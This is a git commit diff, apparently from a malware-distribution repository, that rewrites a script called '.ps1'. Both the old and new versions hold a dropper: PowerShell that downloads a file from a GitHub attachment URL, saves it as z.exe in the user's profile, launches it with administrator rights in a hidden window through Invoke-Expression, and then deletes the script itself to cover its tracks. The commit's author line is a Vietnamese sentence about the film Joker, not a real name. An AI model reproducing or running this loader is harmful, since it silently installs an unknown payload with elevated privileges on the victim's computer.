dc508cc9fcf2adf550876e2490f6a32d000f5ee5
Joker có chủ đề chính là bệnh tâm thần và các triệu chứng liên quan <acc@locallhost.cloud>
2024-06-28 13:19:55 +0700

    Update .ps1

--- .ps1
+++ .ps1
@@ -1,7 +1,13 @@
 @echo off
-echo $Url = 'https://github.com/user-attachments/files/15895328/z.zip'
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $ProgressPreference = 'SilentlyContinue'; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe'; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = '-fullinstall'; $Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden'; Invoke-Expression -Command $Command"
-powershell -Command "Add-Content -Path ok.ps1 -Value 'echo $Url = ''https://github.com/user-attachments/files/15895328/z.zip''; [Net.ServicePointManager]::SecurityProtocol = ''tls12, tls11, tls''; $ProgressPreference = ''SilentlyContinue''; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath ''z.exe''; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = ''-fullinstall''; $Command = ''Start-Process -FilePath ''$InstallerPath'' -ArgumentList ''$Arguments'' -Verb RunAs -WindowStyle Hidden''; Invoke-Expression -Command $Command'"
-powershell.exe -ExecutionPolicy Bypass -File ok.ps1
+powershell -Command "
+[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';
+$ProgressPreference = 'SilentlyContinue';
+$Url = 'https://github.com/user-attachments/files/15895328/z.zip';
+$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe';
+Invoke-WebRequest -Uri $Url -OutFile $OutFile;
+$InstallerPath = $OutFile;
+$Arguments = '-fullinstall';
+$Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden';
+Invoke-Expression -Command $Command
+"
 del %0
-del ok.ps1
